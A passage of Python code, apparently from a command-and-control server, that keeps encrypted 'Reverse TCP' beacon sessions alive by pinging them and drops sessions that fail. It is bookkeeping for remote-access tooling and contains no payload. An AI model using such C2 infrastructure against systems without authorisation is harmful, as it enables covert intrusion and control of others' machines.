    def reconnect_monitor(self):
        while self.is_running:
            with self.lock:
                for session_id, session_data in list(self.active_sessions.items()):
                    if session_data is None:
                        continue
                    last_seen = session_data.get("last_seen", time.time())
                    current_time = time.time()
                    since_last_seen = current_time - last_seen
                    if since_last_seen > self.reconnect_delay_entry and not session_data.get("manual_disconnect", False):
                        try:
                            client_socket = session_data.get("socket")
                            if client_socket is None:
                                continue
                            send_data(client_socket, self.cipher_ase.encrypt("ping"))
                            session_data["last_seen"] = time.time()
                        except Exception as e:
                            self.update_output_text(f"[-] Failed to reconnect beacon {session_id}: {e}\n", is_general=True)
                            self.active_sessions.pop(session_id, None)
                            uuid_str = session_id.replace("Reverse TCP - AES - ", "")
                            self.sessions.pop(uuid_str, None)
                            try:
                                client_socket.close()
                            except:
                                pass
